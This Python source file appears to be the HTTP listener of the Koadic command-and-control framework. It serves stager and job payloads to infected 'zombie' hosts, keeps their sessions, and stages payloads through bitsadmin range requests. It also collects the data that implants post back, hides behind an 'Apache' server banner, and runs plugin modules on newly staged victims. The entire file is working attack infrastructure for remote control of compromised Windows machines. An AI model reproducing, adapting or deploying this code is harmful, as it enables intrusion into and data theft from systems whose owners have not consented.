from socketserver import ThreadingMixIn
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

import cgi
import socket
import random
import threading
import os
import ssl
import io
import time
import copy
import core.job
import core.session
import core.loader
import core.shell
from core.linter import Linter


class Handler(BaseHTTPRequestHandler):

    def reply(self, status, data=b"", headers={}):
        self.shell.print_verbose(f"handler::reply() - sending status {status} with {len(data)} bytes to {str(self.client_address)}")

        self.send_response(status)

        for key, value in headers.items():
            self.send_header(key, value)

        self.end_headers()

        # python is so utterly incapable that we have to write CS 101 socket
        # code
        if data != b"":
            total = len(data)
            written = 0
            while written < total:
                a = self.wfile.write(data[written:])
                self.wfile.flush()

                if a is None:
                    break

                written += a

    def send_file(self, fname):
        with open(fname, "rb") as f:
            fdata = f.read()

        headers = {}
        headers['Content-Type'] = 'application/octet-stream'
        headers['Content-Length'] = len(fdata)
        self.reply(200, fdata, headers)

    def get_header(self, header, default=None):
        if header in self.headers:
            return self.headers[header]

        return default

    # ignore log messages
    def log_message(*arg):
        pass

    def setup(self):
        self.timeout = 90000
        BaseHTTPRequestHandler.setup(self)
        self.request.settimeout(90000)

    #BaseHTTPServer.server_version = 'Apache'
    #BaseHTTPServer.sys_version = ''
    def version_string(self):
        return 'Apache'

    def handle(self):
        """Handles a request ignoring dropped connections."""
        try:
            self.shell = self.server.shell
            self.port = self.server.server_port
            self.linter = Linter()
            self.shell.print_verbose(f"handler::handle() - Incoming HTTP from {str(self.client_address)}")
            self.hostchange = False
            self.dontstage = False

            return BaseHTTPRequestHandler.handle(self)
        except (socket.error, socket.timeout) as e:
            pass
        # except:
            # pass

    def update_session(self):
        self.session.update_active()
        self.options.set("SESSIONKEY", self.session.key)
        self.options.set("SESSIONPATH", f'{self.options.get("SESSIONNAME")}={self.session.key};')


    def init_session(self):
        ip = self.client_address
        agent = self.get_header('user-agent', '')

        self.session = core.session.Session(self.stager, ip[0], agent)
        self.shell.sessions[self.session.key] = self.session
        self.update_session()
        if self.hostchange:
            self.shell.print_warning(f'Stager {self.stager.payload.id}: Changing Zombie {self.session.id} connection URL to {self.options.get("URL")}')

    def find_stager(self, splitted):
        self.endpoint = splitted[0].split("/")[1].split(".")[0]

        if self.endpoint not in self.shell.stagers[self.port]:
            return False

        self.stager = self.shell.stagers[self.port][self.endpoint]
        self.options = copy.deepcopy(self.stager.options)
        return True

    def parse_params(self):
        splitted = self.path.split("?")
        if not self.find_stager(splitted):
            return False
        self.get_params = parse_qs(splitted[1]) if len(splitted) > 1 else {}

        sessionname = self.options.get("SESSIONNAME")

        self.session = None
        self.job = None

        if sessionname in self.get_params:
            sessionvalue = self.get_params[sessionname][0]
            if sessionvalue in self.shell.sessions:
                self.shell.print_verbose(f"handler::parse_params() - found session.key = {sessionvalue}")
                self.session = self.shell.sessions[sessionvalue]
            else:
                self.shell.print_verbose(f"handler::parse_params() - COULD NOT FIND session.key = {sessionvalue}")
                return False

            self.update_session()

        jobname = self.options.get("JOBNAME")
        if jobname in self.get_params:
            self.shell.print_verbose(f"self.params: {self.get_params}")
            if self.get_params[jobname][0] != "stage":
                self.job = [job for jkey, job in self.shell.jobs.items() if job.key == self.get_params[jobname][0]][0]

            if self.job:
                self.shell.print_verbose(f"handler::parse_params() - fetched job_key = {self.job.key}")
                self.options.set("JOBKEY", self.job.key)
                self.options.set("JOBPATH", f"{jobname}={self.job.key};")

        elif self.shell.continuesession:
            self.session = self.shell.continuesession

        if self.headers['host']:
            self.shell.print_verbose(f"handler::parse_params() - Host header present: {self.headers['host']}")
            if ':' in self.headers['host']:
                request_host, request_port = self.headers['host'].split(":")
            else:
                request_host = self.headers['host']
                request_port = self.port
            if str(request_host) != str(self.options.get('SRVHOST')) or str(request_port) != str(self.options.get('SRVPORT')):
                self.shell.print_verbose(f"handler::parse_params() - host change detected: Stager - {self.options.get('SRVHOST')}:{self.options.get('SRVPORT')} | Zombie - {self.headers['host']}")
                if self.options.get('AUTOFWD') == 'true':
                    prefix = "https" if self.stager.is_https else "http"
                    url = prefix + "://" + self.headers['host']
                    endpoint = self.options.get("FENDPOINT").strip()
                    url += "/" + endpoint
                    self.options.set("URL", url)
                    self.hostchange = True
                else:
                    self.shell.print_warning(f"Stager {self.stager.payload.id}: Zombie attempted connection with a different stager URL. Either change SRVHOST/SRVPORT to match or 'set AUTOFWD true'")
                    self.dontstage = True
        else:
            self.shell.print_verbose(f"handler::parse_params() - Host header NOT present")

        return True

    def do_HEAD(self):
        splitted = self.path.split("?")
        if not self.find_stager(splitted):
            return False
        self.init_session()
        template = self.options.get("_STAGETEMPLATE_")
        self.session.bitsadmindata = self.linter.post_process_script(self.options.get("_STAGE_"), template, self.options, self.session).decode()
        self.shell.continuesession = self.session
        headers = {}
        headers['Content-Length'] = len(self.session.bitsadmindata.encode())
        self.reply(200, '', headers)

    # the initial stage is a GET request
    def do_GET(self):
        if self.parse_params():
            if self.options.get("ONESHOT") == "true":
                return self.handle_oneshot()

            if not self.session:
                if self.dontstage:
                    return self.handle_dont_stage()
                else:
                    return self.handle_new_session()

            if self.shell.continuesession:
                return self.handle_bitsadmin_stage()

            if self.job:
                return self.handle_job()

            return self.handle_stage()

        self.reply(404)

    def do_POST(self):
        if self.parse_params():
            if self.options.get("ONESHOT") == "true":
                return self.handle_report()

            if not self.session:
                return self.reply(403)

            if not self.job:
                content_len = int(self.get_header('content-length', 0))

                if content_len == 0:
                    return self.handle_work()

                data = self.rfile.read(content_len)
                self.session.parse_user_info(data)
                self.shell.play_sound('STAGED')

                module = self.session.stager.options.get('MODULE')
                if module:
                    plugin = self.session.shell.plugins[module]
                    import copy
                    old_options = copy.deepcopy(plugin.options)
                    new_options = self.session.stager.options.get('_MODULEOPTIONS_')
                    for o in new_options.options:
                        plugin.options.set(o.name, o.value)
                    plugin.options.set("ZOMBIE", str(self.session.id))
                    plugin.run()
                    for o in old_options.options:
                        plugin.options.set(o.name, o.value)

                return self.reply(200)


            return self.handle_report()

        return self.reply(404)

    def handle_stage(self):
        self.shell.print_verbose("handler::handle_stage()")
        self.options.set("JOBKEY", "stage")
        template = self.options.get("_FORKTEMPLATE_")
        data = self.linter.post_process_script(self.options.get("_STAGE_"), template, self.options, self.session)
        self.reply(200, data)

    def handle_oneshot(self):
        plugin = self.shell.plugins[self.options.get("MODULE")]
        options = self.options.get('_MODULEOPTIONS_')
        workload = f"data/{self.options.get('MODULE')}.js"
        j = plugin.job(self.shell, -1, plugin.STATE, workload, options)
        if j.create == False:
            script = b"Koadic.exit();"
            template = self.options.get("_STAGETEMPLATE_")
            script = self.linter.post_process_script(script, template, self.options, self.session)

            self.reply(200, script)
            return

        j.ip = str(self.client_address[0])
        self.shell.jobs[j.key] = j

        self.shell.print_verbose("handler::handle_oneshot()")
        self.options.set("JOBKEY", j.key)
        script = j.payload()
        template = self.options.get("_STAGETEMPLATE_")
        script = self.linter.post_process_script(script, template, self.options, self.session)

        self.reply(200, script)

    def handle_new_session(self):
        self.shell.print_verbose("handler::handle_new_session()")
        self.init_session()
        template = self.options.get("_STAGETEMPLATE_")
        data = self.linter.post_process_script(self.options.get("_STAGE_"), template, self.options, self.session)
        self.reply(200, data)

    def handle_dont_stage(self):
        self.shell.print_verbose("handler::handle_dont_stage()")
        template = self.options.get("_STAGETEMPLATE_")
        data = self.linter.post_process_script(b"Koadic.exit();", template, self.options, self.session)
        self.reply(200, data)

    def handle_bitsadmin_stage(self):
        rangeheader = self.get_header('range')
        headers = {}
        headers['Content-Length'] = len(self.session.bitsadmindata.encode())
        headers['Accept-Ranges'] = "bytes"
        headers['Content-Range'] = f"bytes 0-{str(len(self.session.bitsadmindata.encode())-1)}/{str(len(self.session.bitsadmindata.encode()))}"
        headers['Content-Type'] = 'application/octet-stream'
        if rangeheader:
            rangehead = rangeheader.split("=")[1]
            if int(rangehead.split("-")[1]) > len(self.session.bitsadmindata.encode())-1:
                end = len(self.session.bitsadmindata.encode())-1
            else:
                end = int(rangehead.split("-")[1])
            headers['Content-Range'] = f"bytes {rangehead.split('-')[0]}-{str(end)}/{str(len(self.session.bitsadmindata.encode()))}"
            partdata = self.session.bitsadmindata.encode()[int(rangehead.split("-")[0]):end+1]
            return self.reply(206, partdata, headers)
        else:
            return self.reply(200, self.session.bitsadmindata.encode(), headers)

    def handle_job(self):
        script = self.job.payload()
        template = self.options.get("_FORKTEMPLATE_")
        script = self.linter.post_process_script(script, template, self.options, self.session)
        self.reply(200, script)

    def handle_work(self):
        count = 0
        while True:
            if self.session.killed:
                return self.reply(500, "");

            job = self.session.get_created_job()
            if job is not None:
                break

            try:
                self.request.settimeout(1)
                if len(self.request.recv(1)) == 0:
                    return
            except Exception as e:
                pass
            self.session.update_active()
            count += 1
            if count > 600:
                self.reply(201, "")
                return

        job.receive()

        # hack to tell us to fork 32 bit
        status = 202 if job.fork32Bit else 201

        self.reply(status, job.key.encode())

    def handle_report(self):
        content_len = int(self.get_header('content-length', 0))
        data = self.rfile.read(content_len)

        errno = self.get_header('errno', False)
        if errno:
            errdesc = self.get_header('errdesc', 'No Description')
            errname = self.get_header('errname', 'Error')
            self.job.error(errno, errdesc, errname, data)
            self.reply(200)
            return

        self.job.report(self, data)

    def do_post(self):
        self.do_POST()

    def do_get(self):
        self.do_GET()

    def parse_post_vars(self):
        ctype, pdict = cgi.parse_header(self.headers['content-type'])
        if ctype == 'multipart/form-data':
            postvars = cgi.parse_multipart(self.rfile, pdict)
        elif ctype == 'application/x-www-form-urlencoded':
            length = int(self.headers['content-length'])
            postvars = parse_qs(self.rfile.read(length), keep_blank_values=1)
        else:
            postvars = {}
        return postvars
